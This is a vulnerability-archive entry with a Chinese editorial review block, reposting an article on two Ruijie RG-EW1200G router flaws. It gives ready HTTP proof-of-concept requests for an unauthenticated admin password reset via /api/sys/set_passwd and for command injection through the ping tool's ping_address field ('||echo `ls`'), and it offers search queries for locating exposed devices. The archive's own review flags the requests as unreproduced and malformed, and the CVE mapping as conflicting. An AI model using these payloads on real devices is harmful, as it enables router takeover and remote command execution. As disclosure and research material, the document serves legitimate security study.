---
cve: "CVE-2023-4169"
id: "vw-1d043972f8c667c6713ae101"
entity_id: "ve-1d043972f8c667c6713ae101"
schema_version: "1"
title: "【接上一篇文章】锐捷 RG-EW1200G 其他两个 CVE 补充 有 RCE 附 POC"
product: "Ruijie RG-EW1200G"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CVE-2023-4169"
referenced_identifiers: ""
prerequisites: "4169 HWR_1.0(1)B1P5 r483未认证；ping需登录"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E9%94%90%E6%8D%B7/%E6%8E%A5%E4%B8%8A%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%20%E9%94%90%E6%8D%B7%20RG-EW1200G%20%E5%85%B6%E4%BB%96%E4%B8%A4%E4%B8%AA%20CVE%20%E8%A1%A5%E5%85%85%20%E6%9C%89%20RCE%20%E9%99%84%20POC.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://mp.weixin.qq.com/s/pXu1ZOqFP_x1DHBFlFGCgg"
source_status: "recorded"
---

# 【接上一篇文章】锐捷 RG-EW1200G 其他两个 CVE 补充 有 RCE 附 POC

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie RG-EW1200G
- 本文讨论：CVE-2023-4169 set_passwd；3306 bf/ping候选
- 版本、权限与配置前提：4169 HWR_1.0(1)B1P5 r483未认证；ping需登录
- 资料类型：改密及认证RCE双漏洞转载；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 元数据仅4169；两个漏洞不同固件条件不能默认可串联
- 改密HTTP Content-Length0却有JSON且无头体空行；ping亦缺分隔
- 3306编号映射与382简介冲突，缺补丁
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- CVE对应和同固件可组合性待研究来源核验
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/pXu1ZOqFP_x1DHBFlFGCgg)

_**说明**_

本以为 RG-EW1200G 只有一个洞，但是去找了一下还有其他三个洞，在这篇文章就统一写一下吧。

_**简介**_  

锐捷网络 RG-EW1200G 是一款有线无线全千兆双频无线路由器，适合平层家居、别墅、小型店铺、SOHO 办公等场景使用。设备性能卓越，足以满足千兆上网需求；信号强劲，信号功率功率提升 3 倍，覆盖距离提升近 1 倍覆盖能力强 。

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfg81LLkuvs0WktpohRjamtR1xYNEdbiaEMbspsoCAzKb0amCs4P15P9NBfJWVJcbL2lqqmaX9qwAIA/640?wx_fmt=png)

_**CVE-2023-4169 未授权任意密码修改**_

_**漏洞描述**_

锐捷网络 RG-EW1200G HWR_1.0(1)B1P5,Release(07161417) r483 存在任意密码修改漏洞，允许未授权用户修改管理员密码、登录路由器、获取敏感信息、控制内部网络。

_**影响版本**_

受影响产品：RG-EW1200G 无线路由器

受影响的固件版本：HWR_1.0(1)B1P5,Release(07161417) r483  

_**漏洞复现**_

POC  

```http
POST /api/sys/set_passwd HTTP/1.1
Host: xxx.xxx.xxx:6060
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
{"username":"admin","admin_new":"123456"}

```

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfg81LLkuvs0WktpohRjamtRH97ygLSGsueGotJfc0aduVxwkDctx5en1kicpAGQKqE97xKhtYmk9Ig/640?wx_fmt=png)

使用修改后的密码能成功登录  

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfg81LLkuvs0WktpohRjamtREDAKGQhH188zoVIU6CRMS5LqcE3sAgJ17xt7KsJo5YTuGGWHCgPrQg/640?wx_fmt=png)

_**CVE-2023-3306 远程命令执行**_

_**漏洞描述**_

RG-EW1200G 管理界面 ping 检测功能中的命令执行漏洞。

_**影响版本**_

RG-EW1200G

_**漏洞利用**_

POC

```http
POST /bf/ping HTTP/1.1
Host: xxx.xxx.xxx:6060
Content-Length: 95
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26
Content-Type: application/json;charset=UTF-8
Origin: http://xxx.xxx.xxx:6060
Referer: http://xxx.xxx.xxx:6060/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: bcrsession=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Edge";v="107", "Chromium";v="107", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
Connection: close
{"ping_address":"||echo `ls`","ping_package_num":5,"ping_package_size":56,"is_first_req":false}

```

1. 登录管理界面，更多功能中的网络工具

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfg81LLkuvs0WktpohRjamtRRbDDmA1doSoAq2WiaiaNHibLSXuYibLFu6LEsibjp7XgLl9SrocEojUdWFg/640?wx_fmt=png)

2. 设置检测地址 “||echo `ls`”

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfg81LLkuvs0WktpohRjamtRJdnSUic8F24Hicz37dTo6mWsfb5n76t1Km47utEbbZX5KnH8Jp1QHxicw/640?wx_fmt=png)

数据包如下

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfg81LLkuvs0WktpohRjamtRAVDmIlS7vmh1nxicClycOoNG27icdpQaN8kreS4yARC035IRN92o3mlA/640?wx_fmt=png)

_**参考链接**_  

```
https://nvd.nist.gov/vuln/detail/CVE-2023-3306
https://nvd.nist.gov/vuln/detail/CVE-2023-4169
https://github.com/RCEraser/cve/blob/main/RG-EW1200G.md
https://github.com/blakespire/repoforcve/tree/main/RG-EW1200G

```

回复 “**CVE-2023-4169**” 获取空间测绘搜索语句

**仅供学习交流，勿用作违法犯罪**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
